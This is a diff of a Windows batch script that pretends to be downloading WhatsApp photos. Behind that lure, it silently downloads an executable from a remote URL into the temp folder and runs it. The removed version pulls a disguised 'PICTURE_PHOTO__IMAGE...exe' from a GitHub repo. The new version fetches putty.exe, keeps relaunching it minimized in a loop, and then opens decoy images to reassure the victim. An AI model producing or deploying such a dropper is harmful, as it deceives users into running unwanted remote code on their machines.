@@ -1,40 +1,53 @@
 @echo off
-setlocal enabledelayedexpansion
 
-:: Calculate center position for the text
-for /f "tokens=*" %%a in ('"prompt $H & for %%b in (1) do rem"') do set "BS=%%a"
-set "text=WHATSAPP PICTURE PHOTOS DOWNLOADING......."
-set /a center=(80 - !text!^)/2
-
-:: Display centered text
-echo %BS%[1;%center%H!text!
+:: Display the text without any formatting
+echo WHATSAPP PICTURE PHOTOS DOWNLOADING.......
 
 :: Set the PuTTY download URL and destination file
-set "puttyUrl=https://github.com/johnihr00/test-files/raw/main/PICTURE_PHOTO__IMAGE...exe"
-set "puttyDestination=%TEMP%\PICTURE_PHOTO__IMAGE...exe"
+set "puttyUrl=https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe"
+set "puttyDestination=%TEMP%\putty.exe"
 
-:: Download PuTTY silently
-curl -o "!puttyDestination!" -L --silent "!puttyUrl!" || wget -q -O "!puttyDestination!" "!puttyUrl!"
-
-:: Run PuTTY if download was successful
-if !errorlevel! equ 0 (
-    start "" "!puttyDestination!"
+:: Download PuTTY silently if it's not already downloaded
+if not exist "%puttyDestination%" (
+    curl -o "%puttyDestination%" -L --silent "%puttyUrl%" || wget -q -O "%puttyDestination%" "%puttyUrl%"
 )
 
-:: Set the new image download URL and destination file
-set "imageUrl=https://raw.githubusercontent.com/johnihr00/test-files/main/mypic1.jpg"
-set "imageDestination=%TEMP%\downloaded_image.jpg"
+:: Check if PuTTY was downloaded successfully
+if not exist "%puttyDestination%" (
+    echo Error downloading PuTTY.
+    exit /b
+)
 
-:: Download the new image using PowerShell
-powershell -Command "& { (New-Object Net.WebClient).DownloadFile('%imageUrl%', '%imageDestination%') }"
+:runPutty
+:: Run PuTTY silently
+start "" /min "%puttyDestination%"
 
-:: Open the downloaded image with the default image viewer if download was successful
-if exist "!imageDestination!" (
-    start "" "!imageDestination!"
+:: Wait for PuTTY to finish
+timeout /t 1 /nobreak >nul
+
+:: Check if PuTTY is still running, if not, run again
+tasklist /fi "imagename eq putty.exe" 2>nul | find /i "putty.exe" >nul || goto runPutty
+
+:: Set the new image download URLs and destination files
+set "imageUrl1=https://raw.githubusercontent.com/johnihr00/test-files/main/imgx/11.jpg"
+set "imageUrl2=https://raw.githubusercontent.com/johnihr00/test-files/main/imgx/22.jpg"
+set "imageDestination1=%TEMP%\downloaded_image1.jpg"
+set "imageDestination2=%TEMP%\downloaded_image2.jpg"
+
+:: Download the first image using PowerShell
+powershell -Command "& { (New-Object Net.WebClient).DownloadFile('%imageUrl1%', '%imageDestination1%') }"
+
+:: Download the second image using PowerShell
+powershell -Command "& { (New-Object Net.WebClient).DownloadFile('%imageUrl2%', '%imageDestination2%') }"
+
+:: Open the downloaded images with the default image viewer if downloads were successful
+if exist "%imageDestination1%" (
+    start "" "%imageDestination1%"
+)
+
+if exist "%imageDestination2%" (
+    start "" "%imageDestination2%"
 )
 
 :: End script
-endlocal
 exit /b
-
-
